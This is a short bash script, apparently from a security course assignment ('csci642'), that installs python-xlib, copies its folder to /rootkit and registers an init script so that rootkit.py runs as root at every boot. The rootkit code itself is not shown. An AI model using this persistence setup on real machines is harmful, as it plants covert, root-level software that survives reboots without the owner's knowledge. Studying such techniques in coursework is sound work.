#!/bin/bash
sudo apt-get install python3-pip
sudo pip3 install python-xlib

mkdir -p /rootkit
cp -r . /rootkit/

cat > /etc/init.d/csci642.sh << EOF
#!/bin/bash
python3 /rootkit/rootkit.py
EOF
	
chown root /etc/init.d/csci642.sh
chmod 700 /etc/init.d/csci642.sh
update-rc.d csci642.sh defaults
